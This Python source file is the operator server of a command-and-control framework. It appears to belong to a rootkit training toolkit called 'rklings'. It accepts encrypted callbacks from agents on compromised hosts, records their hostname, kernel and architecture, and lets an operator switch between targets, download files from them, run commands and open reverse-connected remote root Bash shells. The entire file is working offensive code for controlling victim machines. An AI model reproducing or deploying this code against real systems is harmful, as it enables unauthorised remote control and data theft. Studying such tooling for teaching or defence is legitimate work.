"""Multi-target operator server.

Pure TCP callback architecture: the server binds fixed ports, agents call
back when they load. No filesystem coupling between server and targets.
"""

from __future__ import annotations

import json
import logging
import os
import select
import socket
import socketserver
import sys
import threading
import time
from pathlib import Path
from typing import Callable

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter, Completer, Completion
from prompt_toolkit.patch_stdout import patch_stdout
from rich.console import Console as RichConsole
from rich.table import Table

import lib.operator as _config
from lib.operator.control_console import (
    DEFAULT_BIND_ADDR,
    DEFAULT_CONTROL_PORT,
    DEFAULT_SHELL_PORT,
    OperatorConsole,
    OperatorError,
    OpenSslAead,
    SecureControl,
    accept_shell,
    build_crypto_helper,
    encode_control_command,
    listener,
    new_key,
    parse_shell_ticket,
    protocol_error,
    receive_frame,
    relay_shell,
    send_frame,
    setup_logging as _setup_logging,
)
from lib.operator.dashboard import add_event

log = logging.getLogger("operator")

STATE_FILE = "server.json"


# ---------------------------------------------------------------------------
# Target: one connected agent
# ---------------------------------------------------------------------------

class Target:
    def __init__(
        self,
        target_id: str,
        label: str,
        peer: socket.socket,
        secure: SecureControl,
        shell_listener: socket.socket,
    ):
        self.id = target_id
        self.label = label
        self.peer = peer
        self.secure = secure
        self.shell_listener = shell_listener
        self.hostname = ""
        self.kernel = ""
        self.arch = ""
        self.build_id = ""
        self.online = True
        self._generation = 0
        self._lock = threading.Lock()
        self._exec_shell = None
        self._exec_lock = threading.Lock()

    def reconnect(self, peer, secure):
        with self._lock:
            try:
                self.peer.close()
            except Exception:
                pass
            self.peer = peer
            self.secure = secure
            self._generation += 1
            self.online = True
            self._close_exec_shell()

    def exchange(self, command: str) -> str:
        with self._lock:
            try:
                payload = encode_control_command(command)
                send_frame(self.peer, self.secure.seal_request(payload))
                reply = self.secure.open_reply(receive_frame(self.peer))
                return reply.decode("ascii", errors="replace")
            except Exception:
                self.online = False
                raise

    def download_file(
        self,
        path: str,
        on_progress: Callable[[int, int], None] | None = None,
    ) -> tuple[bytes, int]:
        with self._lock:
            try:
                payload = encode_control_command(f"DOWNLOAD {path}")
                send_frame(self.peer, self.secure.seal_request(payload))
                header = self.secure.open_reply(
                    receive_frame(self.peer)
                ).decode("ascii", errors="replace")
            except Exception:
                self.online = False
                raise
            if header.startswith("ERR"):
                raise OperatorError(f"download failed: {header}")
            if not header.startswith("FILE "):
                self.online = False
                raise OperatorError(f"unexpected reply: {header}")
            try:
                total = int(header.split()[1])
                chunks = []
                received = 0
                while True:
                    frame = receive_frame(self.peer)
                    raw = self.secure.open_reply(frame)
                    if raw == b"EOF":
                        break
                    chunks.append(raw)
                    received += len(raw)
                    if on_progress:
                        on_progress(received, total)
                return b"".join(chunks), total
            except Exception:
                self.online = False
                raise

    def _request_shell(self, command: str, timeout: float) -> socket.socket:
        with self._lock:
            try:
                shell_port = self.shell_listener.getsockname()[1]
                payload = encode_control_command(f"{command} {shell_port}")
                send_frame(self.peer, self.secure.seal_request(payload))
                reply = self.secure.open_reply(
                    receive_frame(self.peer)
                ).decode("ascii", errors="replace")
            except Exception:
                self.online = False
                raise
            if reply.startswith("ERR"):
                msg = protocol_error(reply) or reply
                raise OperatorError(f"shell failed: {msg}")
            request_id, cookie = parse_shell_ticket(reply)
            return accept_shell(
                self.shell_listener,
                request_id,
                cookie,
                timeout,
            )

    def open_shell(self, timeout: float = 10) -> socket.socket:
        return self._request_shell("SHELL", timeout)

    def open_exec_shell(self, timeout: float = 10) -> socket.socket:
        return self._request_shell("EXEC_SHELL", timeout)

    def _ensure_exec_shell(self, timeout: float = 10) -> socket.socket:
        if self._exec_shell is not None:
            try:
                self._exec_shell.sendall(b"")
                return self._exec_shell
            except OSError:
                self._exec_shell = None
        shell = self.open_exec_shell(timeout)
        shell.settimeout(timeout)
        shell.recv(4096)
        self._exec_shell = shell
        return shell

    def exec_shell(self, command: str, timeout: float = 5) -> str:
        nonce = f"_RK{id(command) & 0xFFFF:04X}_"
        start_marker = f"__START{nonce}__"
        end_marker = f"__EOF{nonce}__"
        with self._exec_lock:
            shell = self._ensure_exec_shell(timeout)
            try:
                shell.settimeout(0.05)
                try:
                    while shell.recv(4096):
                        pass
                except (socket.timeout, BlockingIOError, OSError):
                    pass
                shell.settimeout(timeout)
                wire = f"echo {start_marker}\n{command}\necho {end_marker}\n"
                shell.sendall(wire.encode())
                buf = b""
                end_bytes = end_marker.encode()
                while end_bytes not in buf:
                    chunk = shell.recv(4096)
                    if not chunk:
                        self._exec_shell = None
                        break
                    buf += chunk
            except Exception:
                self._exec_shell = None
                raise
        text = buf.decode("utf-8", errors="replace")
        start = text.find(start_marker)
        if start >= 0:
            text = text[start + len(start_marker):]
        end = text.find(end_marker)
        if end >= 0:
            text = text[:end]
        return text.strip()

    def _close_exec_shell(self):
        if self._exec_shell is not None:
            try:
                self._exec_shell.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self._exec_shell.close()
            except OSError:
                pass
            self._exec_shell = None

    def close(self) -> None:
        self.online = False
        self._close_exec_shell()
        for resource in (self.peer, self.secure):
            try:
                resource.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Target manager
# ---------------------------------------------------------------------------

class TargetManager:
    def __init__(self):
        self._targets: dict[str, Target] = {}
        self._next_id = 1
        self._lock = threading.Lock()

    def add(
        self,
        label: str,
        peer: socket.socket,
        secure: SecureControl,
        shell_listener: socket.socket,
    ) -> tuple[Target, bool]:
        with self._lock:
            for existing in self._targets.values():
                if existing.label == label:
                    existing.reconnect(peer, secure)
                    return existing, True
            target_id = f"target-{self._next_id}"
            self._next_id += 1
            target = Target(
                target_id, label, peer, secure, shell_listener,
            )
            self._targets[target_id] = target
            return target, False

    def remove(self, target_id: str) -> Target | None:
        with self._lock:
            target = self._targets.pop(target_id, None)
            if target:
                target.close()
            return target

    def get(self, target_id: str) -> Target | None:
        with self._lock:
            return self._targets.get(target_id)

    def list_all(self) -> list[Target]:
        with self._lock:
            return list(self._targets.values())

    def close_all(self) -> None:
        with self._lock:
            for target in self._targets.values():
                target.close()
            self._targets.clear()


# ---------------------------------------------------------------------------
# Connection handler
# ---------------------------------------------------------------------------

class _SessionHandler(socketserver.BaseRequestHandler):
    def handle(self):
        server_ctx = self.server.server_ctx
        peer = self.request
        peer.settimeout(30)

        try:
            secure = SecureControl(
                server_ctx["key"],
                lambda key: OpenSslAead(
                    key, server_ctx["helper"],
                    lambda msg: log.debug("%s", msg.rstrip()),
                ),
            )
            session_id = secure.accept_hello(receive_frame(peer))
        except Exception as e:
            log.warning("reject   %s", e)
            return

        # Query INFO to identify the agent before registering.
        try:
            payload = encode_control_command("INFO")
            send_frame(peer, secure.seal_request(payload))
            reply = secure.open_reply(receive_frame(peer))
            info_str = reply.decode("ascii", errors="replace")
        except Exception:
            log.warning("reject   INFO exchange failed")
            return

        hostname = "unknown"
        kernel_ver = ""
        arch = ""
        build_id = ""
        if info_str.startswith("INFO "):
            parts = info_str[5:].split(None, 3)
            if len(parts) >= 1:
                hostname = parts[0]
            if len(parts) >= 2:
                kernel_ver = parts[1]
            if len(parts) >= 3:
                arch = parts[2]
            if len(parts) >= 4:
                build_id = parts[3]

        target, is_reconnect = server_ctx["manager"].add(
            hostname, peer, secure, server_ctx["shell_listener"],
        )
        target.hostname = hostname
        target.kernel = kernel_ver
        target.arch = arch
        target.build_id = build_id

        verb = "reconn" if is_reconnect else "connect"
        info_tag = f" [{hostname}]" if hostname != "unknown" else ""
        log.info(
            "%s  %s%s  session=%016x",
            verb, target.id, info_tag, session_id,
        )
        add_event(
            f"{verb} {target.id}{info_tag}",
            "reconnect" if is_reconnect else "connect",
        )

        peer.settimeout(None)
        peer.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        peer.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
        peer.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
        peer.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)

        my_gen = target._generation
        while target.online and target._generation == my_gen:
            try:
                ready, _, _ = select.select([peer], [], [], 1.0)
                if ready:
                    chunk = peer.recv(1, socket.MSG_PEEK)
                    if not chunk:
                        break
            except (OSError, ValueError):
                break

        if target._generation == my_gen:
            target.online = False
            log.info(
                "lost     %s (%s): agent disconnected, waiting for reconnect",
                target.id, target.label,
            )
            add_event(
                f"lost {target.id} ({target.label})",
                "disconnect",
            )


class _ControlServer(socketserver.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, sock: socket.socket, ctx: dict):
        self.server_ctx = ctx
        super().__init__(sock.getsockname(), _SessionHandler)
        self.socket.close()
        self.socket = sock


# ---------------------------------------------------------------------------
# Server console (targets / use / kick)
# ---------------------------------------------------------------------------

class _TargetCompleter(Completer):
    def __init__(self, manager: TargetManager, online_only: bool = False):
        self._manager = manager
        self._online_only = online_only

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        for target in self._manager.list_all():
            if self._online_only and not target.online:
                continue
            if target.id.startswith(text):
                yield Completion(target.id, start_position=-len(text))


class ServerConsole:
    def __init__(self, manager: TargetManager, root: Path):
        self._manager = manager
        self._root = root
        self._rc = None
        self._session = PromptSession(
            completer=NestedCompleter.from_nested_dict({
                "targets": None,
                "use": _TargetCompleter(manager, online_only=True),
                "kick": _TargetCompleter(manager),
                "info": None,
                "help": None,
                "quit": None,
            }),
        )

    def do_targets(self, arg: str) -> None:
        targets = self._manager.list_all()
        if not targets:
            log.info("  (no targets connected)")
            return
        table = Table(show_header=True, padding=(0, 1))
        table.add_column("ID", style="cyan bold")
        table.add_column("Label", style="bold")
        table.add_column("Status")
        table.add_column("Peer", style="dim")
        table.add_column("Info", style="dim")
        for t in targets:
            status = "[green]online[/green]" if t.online else "[red]offline[/red]"
            peer = ""
            try:
                addr, port = t.peer.getpeername()
                peer = f"{addr}:{port}"
            except Exception:
                pass
            info = f"{t.hostname} {t.kernel} {t.arch}" if t.hostname else ""
            table.add_row(t.id, t.label, status, peer, info)
        self._rc.print(table)

    def do_use(self, arg: str) -> None:
        target_id = arg.strip()
        if not target_id:
            log.warning("usage: use <target-id>")
            return
        if target_id.isdigit():
            target_id = f"target-{target_id}"
        target = self._manager.get(target_id)
        if not target:
            log.warning("unknown target: %s", target_id)
            return
        if not target.online:
            log.warning("%s is offline", target_id)
            return
        log.info("switched to %s", target_id)
        _run_target_console(target)
        log.info("back to server view")

    def do_kick(self, arg: str) -> None:
        target_id = arg.strip()
        if not target_id:
            log.warning("usage: kick <target-id>")
            return
        if target_id.isdigit():
            target_id = f"target-{target_id}"
        target = self._manager.remove(target_id)
        if target:
            log.info("removed %s", target_id)
        else:
            log.warning("unknown target: %s", target_id)

    def do_info(self, arg: str) -> None:
        targets = self._manager.list_all()
        online = sum(1 for t in targets if t.online)
        log.info("  targets: %d (%d online)", len(targets), online)

    def do_quit(self, arg: str) -> bool:
        return True

    def do_help(self, arg: str) -> None:
        log.info(
            "Server\n"
            "  targets             list connected targets\n"
            "  use ID              switch to target (use 1 or use target-1)\n"
            "  kick ID             disconnect and remove a target\n"
            "  info                target count and status\n"
            "  quit                stop the server"
        )

    def run(self) -> None:
        with patch_stdout(raw=True):
            self._rc = RichConsole(highlight=False)
            while True:
                try:
                    line = self._session.prompt("server> ")
                except EOFError:
                    break
                except KeyboardInterrupt:
                    continue
                line = line.strip()
                if not line:
                    continue
                parts = line.split(None, 1)
                cmd_name = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                handler = getattr(self, f"do_{cmd_name}", None)
                if handler:
                    if handler(arg):
                        break
                else:
                    log.warning("unknown command: %s; type help", line)


def _run_target_console(target: Target) -> None:
    def exchange(command: str) -> str:
        log.info("send    %s", command)
        reply = exchange_quiet(command)
        if reply:
            log.info("recv    %s", reply)
        return reply

    def exchange_quiet(command: str) -> str:
        try:
            return target.exchange(command)
        except (OSError, OperatorError) as error:
            target.online = False
            log.warning("%s disconnected: %s", target.id, error)
            return ""

    def handle_shell(reply: str) -> None:
        request_id, cookie = parse_shell_ticket(reply)
        log.info("  waiting for shell callback...")
        shell = accept_shell(
            target.shell_listener,
            request_id,
            cookie,
            30,
        )
        log.info("shell connected")
        log.info("  Remote root Bash. Type exit to return.")
        with shell:
            relay_shell(shell, sys.stdin, lambda msg: sys.stdout.write(msg))
        log.info("Remote Bash closed.")

    console = OperatorConsole(
        exchange, exchange_quiet, handle_shell,
        shell_port=target.shell_listener.getsockname()[1],
        target=target,
    )
    console.prompt = f"{target.id}> "
    try:
        console.run()
    except KeyboardInterrupt:
        print()


# ---------------------------------------------------------------------------
# Server state (written on startup, read by ./rklings run)
# ---------------------------------------------------------------------------

def write_server_state(root: Path, key: bytes, control_port: int, shell_port: int):
    state_dir = root / _config.state_dir
    state_dir.mkdir(parents=True, exist_ok=True)
    state_file = state_dir / STATE_FILE
    state = {
        "key_hex": key.hex(),
        "control_port": control_port,
        "shell_port": shell_port,
        "pid": os.getpid(),
    }
    state_file.write_text(json.dumps(state) + "\n")
    state_file.chmod(0o600)


def read_server_state(root: Path) -> dict:
    state_file = root / _config.state_dir / STATE_FILE
    if not state_file.exists():
        raise OperatorError(
            "server is not running; start it first: ./rklings server"
        )
    state = json.loads(state_file.read_text())
    pid = state.get("pid", 0)
    try:
        os.kill(pid, 0)
    except (ProcessLookupError, PermissionError, OSError):
        raise OperatorError(
            "server is not running; start it first: ./rklings server"
        )
    return state


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run_server(
    root: Path,
    *,
    transcript: Callable[[list[object]], None],
    banner: str = "",
    webapp_dist: Path | None = None,
    bind_addr: str = DEFAULT_BIND_ADDR,
    control_port: int = DEFAULT_CONTROL_PORT,
    shell_port: int = DEFAULT_SHELL_PORT,
    **_kwargs,
) -> int:
    _setup_logging()

    if banner:
        log.info("%s", banner.rstrip())

    helper = build_crypto_helper(
        root, root / _config.state_dir / "tools", transcript,
        lambda msg: log.debug("%s", msg.rstrip()),
    )

    key = new_key()
    control_listener = listener(bind_addr, control_port)
    shell_listener = listener(bind_addr, shell_port)

    actual_control = control_listener.getsockname()[1]
    actual_shell = shell_listener.getsockname()[1]

    write_server_state(root, key, actual_control, actual_shell)

    log.info("  control  %s:%d", bind_addr, actual_control)
    log.info("  shell    %s:%d", bind_addr, actual_shell)
    log.info("  key      %s", key.hex())

    manager = TargetManager()

    ctx = {
        "key": key,
        "helper": helper,
        "manager": manager,
        "shell_listener": shell_listener,
    }
    server = _ControlServer(control_listener, ctx)

    try:
        threading.Thread(
            target=server.serve_forever, daemon=True,
        ).start()

        from lib.operator.dashboard import start_dashboard
        if webapp_dist is None:
            webapp_dist = root / "webapp" / "dist"
        if webapp_dist.is_dir():
            start_dashboard(
                manager, webapp_dist / "index.html",
                lambda msg: log.info("%s", msg.rstrip()),
            )

        console = ServerConsole(manager, root)
        console.run()
        return 0
    except KeyboardInterrupt:
        return 0
    finally:
        manager.close_all()
        server.shutdown()
        shell_listener.close()
        state_file = root / _config.state_dir / STATE_FILE
        state_file.unlink(missing_ok=True)
